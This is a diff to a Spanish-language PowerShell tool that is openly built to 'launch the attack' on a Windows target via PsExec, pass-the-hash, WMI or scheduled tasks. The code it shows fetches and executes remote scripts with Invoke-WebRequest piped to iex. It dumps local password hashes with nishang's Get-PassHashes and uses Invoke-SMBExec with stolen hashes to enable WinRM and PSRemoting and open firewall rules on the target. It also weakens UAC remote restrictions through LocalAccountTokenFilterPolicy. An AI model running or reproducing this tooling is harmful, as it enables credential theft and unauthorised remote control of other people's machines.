@@ -24,7 +24,7 @@ function Show-Menu {
      Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
      Write-Host "" 
      Write-Host "[1] - Lanzar el ataque a través de PsExec"
-     Write-Host "[2] - Lanzar el ataque a través de Pass the Hash"
+     Write-Host "[2] - Lanzar el ataque a través de Pass the Hash (Beta)"
      Write-Host "[3] - Lanzar el ataque a través de WMI"
      Write-Host "[4] - Lanzar el ataque a través de ScheduleTask"
      Write-Host "[5] - Cerrar el programa"
@@ -66,6 +66,7 @@ function ConvertFrom-SecureToPlain {
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
+        $PassTheHash = "true"
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" -UseBasicParsing | iex
@@ -79,10 +80,10 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
-        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose
-        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose
-        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose
-        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose }
+        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose -ErrorAction SilentlyContinue
+        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose -ErrorAction SilentlyContinue
+        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose -ErrorAction SilentlyContinue
+        Invoke-SMBExec -Target $computer -Username $user -Hash $password -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose -ErrorAction SilentlyContinue }
         
 	'3' {
         Write-Host ""
@@ -124,9 +125,11 @@ function ConvertFrom-SecureToPlain {
         
       } until ($input -in '1','2','3','4')
 
-Write-Host ""
+
+if($PassTheHash -eq "true") { Write-Host "Función no disponible todavía :(" -ForegroundColor Red ; sleep -milliseconds 2500 ; exit }
+else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-$RDP = New-PSSession -Computer $computer -credential $credential
+$RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
 Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
 Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
